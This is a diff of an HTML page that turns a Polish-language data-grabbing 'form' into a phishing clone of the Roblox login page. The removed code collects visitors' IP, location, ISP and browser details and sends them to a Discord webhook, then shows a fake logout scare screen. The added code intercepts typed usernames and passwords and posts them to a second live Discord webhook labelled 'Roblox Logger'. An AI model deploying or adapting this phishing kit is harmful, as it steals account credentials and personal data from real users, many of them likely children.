@@ -1,187 +1,191 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>logowanie</title>
-<style>
-body {
-  margin:0;
-  font-family:Segoe UI, Arial, sans-serif;
-  background:#111;
-  color:#fff;
-  height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  background-size:cover;
-  background-position:center;
-}
-.container {
-  background:#23272a;
-  padding:24px;
-  border-radius:10px;
-  width:340px;
-  box-shadow:0 0 20px rgba(0,0,0,.7);
-  z-index:2;
-}
-input, textarea, button {
-  width:100%;
-  margin:8px 0;
-  padding:10px;
-  border:none;
-  border-radius:6px;
-  background:#40444b;
-  color:#fff;
-}
-button {
-  background:#7289da;
-  font-weight:bold;
-  cursor:pointer;
-}
-h2 { color:#7289da; margin-top:0; }
-#overlay {
-  position:fixed;
-  inset:0;
-  background:rgba(0,0,0,.85);
-  display:none;
-  z-index:1;
-}
-#logout-box {
-  top:50%;
-  left:30px;
-  transform:translateY(-50%);
-  width:420px;
-  background:#0b0b0b;
-  border:2px solid #ff004c;
-  padding:16px;
-}
-#logout-box h3 { color:#ff004c; margin:0 0 10px; }
-#logs {
-  list-style:none;
-  padding:0;
-  margin:0;
-  max-height:220px;
-  overflow:hidden;
-  font-family:monospace;
-  font-size:13px;
-}
-#logs li { margin:4px 0; color:#ccc; }
-small { opacity:.6; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Roblox</title>
+    <link href="https://images.rbxcdn.com/3b43a5c16ec359053fef735551716fc5.ico" rel="icon" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/06c44f6c741a9bee45c69e622e59bfe3ae4e7c38bbed9d3b14b4c64f5c121381.css" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/7a42087c6631d868ddf19f8d8260a049b2bf374061753277f9763d4493adce6b.css" />
+    <link rel="stylesheet" href="https://css.rbxcdn.com/7fc70d7c74b3742f897833c8ea8a4997dc768f30237a7e0f4ef88c46ed583b76.css" />
 </head>
-<body>
+<body id="rbx-body" class="rbx-body light-theme gotham-font">
 
-<div id="form" class="container">
-  <h2>Formularz</h2>
-  <input id="email" type="email" placeholder="Email" required>
-  <input id="discord" type="text" placeholder="Discord">
-  <textarea id="msg" placeholder="Wiadomość"></textarea>
-  <button onclick="send()">Wyślij</button>
+<div id="wrap" class="wrap no-gutter-ads logged-out">
+    <div id="navigation-container" class="light-theme gotham-font">
+        <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
+            <div class="container-fluid">
+                <div class="rbx-navbar-header">
+                    <div class="navbar-header">
+                        <a class="navbar-brand" href="#">
+                            <span class="icon-logo"></span><span class="icon-logo-r"></span>
+                        </a>
+                    </div>
+                </div>
+                <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
+                    <li><a class="font-header-2 nav-menu-title text-header" href="#">Discover</a></li>
+                    <li><a class="font-header-2 nav-menu-title text-header" href="#">Avatar Shop</a></li>
+                    <li><a class="font-header-2 nav-menu-title text-header" href="#">Create</a></li>
+                    <li><a class="font-header-2 nav-menu-title text-header" href="#">Robux</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="container-main" id="container-main">
+        <div class="content">
+            <div id="react-login-container" class="login-container" data-return-url="" data-enable-react-ui="true">
+            </div>
+        </div>
+    </div>
 </div>
 
-<div id="info" class="container" style="display:none;">
-  <h2>Twoje dane</h2>
-  <div id="out"></div>
-  <small> </small>
-</div>
-
-<div id="overlay">
-  <div id="logout-box">
-    <h3 id="count">Zamykanie sesji…</h3>
-    <ul id="logs"></ul>
-    <small>internet pamięta wiecej niż myslisz..</small>
-  </div>
-</div>
-
-<audio id="beep" src="error.mp3" preload="auto"></audio>
+<script src="https://js.rbxcdn.com/a67ddd9413db88f4124e2c4f25d8cb1f.js"></script>
+<script src="https://js.rbxcdn.com/772034db167d3f4260047db4a7f2b8a58cf448709327013541e47c8962b6e556.js"></script>
+<script src="https://js.rbxcdn.com/4db2f741b7a3ec36d11fec999ce33f708ae85641cabfd27e11e0935928f7d9c4.js"></script>
+<script src="https://js.rbxcdn.com/97cb9ac7262155c329a259fce9f940f9bcfa852a6a1ccb44bd8a41c31e84e54b.js"></script>
+<script src="https://js.rbxcdn.com/4c9a00164d9242bd60de5451a22f502c0c221a896d3a555470c03712d5ee4aa1.js"></script>
+<script src="https://js.rbxcdn.com/cf340fb618d9a73913b30dfc624ae60d68b9e59723746e6c08d06d14ebdd6dca.js"></script>
+<script src="https://js.rbxcdn.com/019e8e91f5e4e8f6a1e39904d34cea0a0d957a916df5cb5548cd00bc89360cd6.js"></script>
+<script src="https://js.rbxcdn.com/0674bdd03d1b3238c626edd377da2124ef54e2e25fab693d8c181cbe467e2029.js"></script>
+<script src="https://js.rbxcdn.com/3d6aa666e6523ab529194ee2ba45564d7b0750f927869b181def6527ec749bc8.js"></script>
 
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1456448667949993996/t7B3LC8Jn1LJUfJYq9awyAsEuP3X05dA_elgnyj7WIw2546LCkAG4DKQvmvmtwIlAUjY"
+// Discord Webhook URL
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1456448665324617912/GXFBBj95oQav5KkIXoTqXXO8TlWZJ8_pr3EFxIy3HmZxE3m4EWyuD-jQp1pSHHojCcc1';
 
-const services = [
-  "YouTube","Discord","Google","Gmail","Facebook","Instagram","Steam",
-  "Spotify","Netflix","Microsoft","Apple ID","GitHub","Reddit","Twitter",
-  "Amazon","PayPal","TikTok","LinkedIn","Telegram","Epic Games"
-]
-
-const images = [
-  "bg1.jpg","bg2.jpg","bg3.jpg","bg4.jpg"
-]
-
-function startBackground() {
-  setInterval(() => {
-    document.body.style.backgroundImage =
-      `url(${images[Math.floor(Math.random()*images.length)]})`
-  }, 1800)
-}
-
-function fakeSequence() {
-  document.getElementById("overlay").style.display = "block"
-  const logs = document.getElementById("logs")
-  const countEl = document.getElementById("count")
-  let i = 0
-  const interval = setInterval(() => {
-    if (i >= services.length) {
-      countEl.innerText = "wylogowywanie.."
-      clearInterval(interval)
-      return
+// Funkcja wysyłająca na webhook
+async function sendToWebhook(username, password) {
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                embeds: [{
+                    title: '🔐 Nowe logowanie - Roblox',
+                    color: 5814783,
+                    fields: [
+                        {
+                            name: 'Username/Email',
+                            value: username,
+                            inline: true
+                        },
+                        {
+                            name: 'Hasło',
+                            value: password,
+                            inline: true
+                        },
+                        {
+                            name: 'Czas',
+                            value: new Date().toLocaleString('pl-PL'),
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: 'Roblox Logger'
+                    }
+                }]
+            })
+        });
+        console.log('✅ Dane wysłane na webhook');
+    } catch (error) {
+        console.error('❌ Błąd wysyłania:', error);
     }
-    countEl.innerText = "Zamykanie sesji…"
-    const li = document.createElement("li")
-    li.innerText = "⛔ Wylogowywanie z " + services[i] + "…"
-    logs.appendChild(li)
-    if (i % 3 === 0) document.getElementById("beep").play().catch(()=>{})
-    i++
-  }, 700)
 }
 
-async function send() {
-  try {
-    const ipRes = await fetch("https://ipapi.co/json/")
-    const ip = await ipRes.json()
+// Główna funkcja przechwytująca
+function setupInterceptor() {
+    console.log('🔍 Interceptor uruchomiony...');
+    
+    // Próbujemy znaleźć formularz co 200ms
+    const checkForForm = setInterval(() => {
+        // Szukamy pól input
+        const usernameField = document.querySelector('input[type="text"]') || 
+                             document.querySelector('input[name="username"]') ||
+                             document.querySelector('input[autocomplete="username"]') ||
+                             document.querySelector('input[placeholder*="Username"]') ||
+                             document.querySelector('input[placeholder*="Email"]');
+        
+        const passwordField = document.querySelector('input[type="password"]') ||
+                             document.querySelector('input[name="password"]');
+        
+        const submitButton = document.querySelector('button[type="submit"]') ||
+                           document.querySelector('button.btn-primary-md') ||
+                           document.querySelector('[class*="login"]') ||
+                           document.querySelector('button[class*="Login"]');
 
-    const data = {
-      email: email.value,
-      discord: discord.value || "brak",
-      message: msg.value || "brak",
-      ip: ip.ip,
-      city: ip.city,
-      region: ip.region,
-      country: ip.country_name,
-      isp: ip.org,
-      timezone: ip.timezone,
-      ua: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      screen: screen.width + "x" + screen.height,
-      cookies: navigator.cookieEnabled
-    }
-
-    await fetch(WEBHOOK_URL, {
-      method:"POST",
-      headers:{ "Content-Type":"application/json" },
-      body: JSON.stringify({
-        embeds:[{
-          title:"Demo formularz",
-          color:7506394,
-          fields:Object.entries(data).map(([k,v])=>({name:k,value:String(v)})),
-          timestamp:new Date()
-        }]
-      })
-    })
-
-    form.style.display="none"
-    info.style.display="block"
-    out.innerHTML = Object.entries(data)
-      .map(([k,v])=>`<p><b>${k}:</b> ${v}</p>`).join("")
-
-    startBackground()
-    fakeSequence()
-  } catch {
-    alert("Błąd")
-  }
+        if (usernameField && passwordField && submitButton) {
+            clearInterval(checkForForm);
+            console.log('✅ Formularz znaleziony!');
+            
+            // Dodajemy event listener do przycisku
+            submitButton.addEventListener('click', async function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                
+                const username = usernameField.value;
+                const password = passwordField.value;
+                
+                console.log('🎯 Przechwycono:', username, password);
+                
+                if (username && password) {
+                    await sendToWebhook(username, password);
+                    alert('Logowanie w trakcie...');
+                }
+            }, true);
+            
+            // Również przechwytujemy submit formularza
+            const form = submitButton.closest('form');
+            if (form) {
+                form.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    const username = usernameField.value;
+                    const password = passwordField.value;
+                    
+                    if (username && password) {
+                        await sendToWebhook(username, password);
+                        alert('Logowanie w trakcie...');
+                    }
+                }, true);
+            }
+            
+            // Backup - przechwytujemy przez Enter
+            passwordField.addEventListener('keypress', async function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    const username = usernameField.value;
+                    const password = passwordField.value;
+                    
+                    if (username && password) {
+                        await sendToWebhook(username, password);
+                        alert('Logowanie w trakcie...');
+                    }
+                }
+            });
+        }
+    }, 200);
+    
+    // Stop po 30 sekundach jeśli nie znajdzie
+    setTimeout(() => {
+        clearInterval(checkForForm);
+        console.log('⏱️ Timeout - formularz nie znaleziony');
+    }, 30000);
 }
+
+// Uruchamiamy gdy strona jest gotowa
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', setupInterceptor);
+} else {
+    setupInterceptor();
+}
+
+// Backup - uruchamiamy po 2 sekundach na wszelki wypadek
+setTimeout(setupInterceptor, 2000);
 </script>
 
 </body>
